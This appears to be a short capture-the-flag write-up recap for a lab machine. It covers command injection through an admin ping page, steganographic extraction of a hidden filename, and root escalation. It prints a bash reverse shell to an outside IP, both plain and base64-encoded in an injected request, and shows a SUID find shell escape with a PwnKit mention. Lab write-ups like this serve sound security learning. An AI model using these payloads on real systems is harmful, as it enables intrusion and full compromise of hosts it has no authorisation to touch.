#### Recap
Only HTTP was exposed. Directory discovery located an administrator page that used a submitted address in a system command. The response confirmed command injection.
```bash
# Original test input
bash -i >& /dev/tcp/192.168.45.189/4444 0>&1

# Encoded request representation
pinger=192.168.45.189|echo+YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE4OS80NDQ0IDA%2bJjEK+|base64+-d|bash&submitt=Submit+Query
```
The test yielded execution as www-data and access to the first flag.


A deliberately hidden passphrase in the page source led to an embedded file inside an image. The clue was consistent with the site's sparse image-based design.
```bash
steghide info haclabs.jpeg 
# Enter passphrase:
# embedded file "imp.txt":

steghide --extract -sf haclabs.jpeg
# Enter passphrase: 
# wrote extracted data to "imp.txt".

cat imp.txt
# c3VwZXJhZG1pbi5waHA=

echo "c3VwZXJhZG1pbi5waHA=" | base64 -d
# superadmin.php
```
The hidden message pointed back to the command injection page. It was an alternate discovery path rather than a new privilege escalation lead.

SUID pkexec was vulnerable to PwnKit. The separate SUID configuration on find also warranted assessment.
```bash
find . -exec /bin/sh -p \; -quit
```
Both local paths yielded root access.
